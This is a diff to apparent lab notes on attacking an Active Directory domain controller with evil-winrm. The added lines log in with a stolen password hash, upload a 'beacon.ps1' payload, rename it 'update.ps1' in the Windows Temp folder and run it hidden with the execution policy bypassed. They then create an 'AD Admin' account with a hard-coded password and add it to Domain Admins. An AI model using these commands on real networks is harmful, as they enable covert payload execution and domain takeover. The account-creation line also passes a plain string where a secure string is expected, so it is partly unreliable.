@@ -9,10 +9,19 @@ sudo gem install evil-winrm
 
 evil-winrm -i <domain controller ip> -u <Privileged user> -H <hash> -s ~/pathto/scripts/
 
+evil-winrm -i <domain controller ip> -u <Privileged user> -H <hash> << 'EOF' 
+upload beacon.ps1 
+move beacon.ps1 C:\Windows\Temp\update.ps1
+powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\update.ps1 
+exit
+
 Inside of Evil-winrm
 Get-ADUser -Filter *
+Get-ADOrganizationalUnit -Filter *
 
-New-ADUser -Name "AD Admin" -UserPrincipalName "adadmin@lab.local" -Path "OU=Admins,DC=Lab,DC=local" -AccountPassword (Read-Host -AsSecureString "bananaur") -Enabled $true 
+$password = "banana!"
+New-ADUser -Name "AD Admin" -SamAccountName "adadmin" -UserPrincipalName "adadmin@lab.local" -Path "OU=Admins,DC=Lab,DC=local" -AccountPassword $password -Enabled $true 
+Add-ADGroupMember -Identity "Domain Admins" -Members "adadmin"
 
 $gpo = New-GPO -Name "Enable Remote Desktop"
 Set-GPRegistryValue -Name "Enable Remote Desktop" `
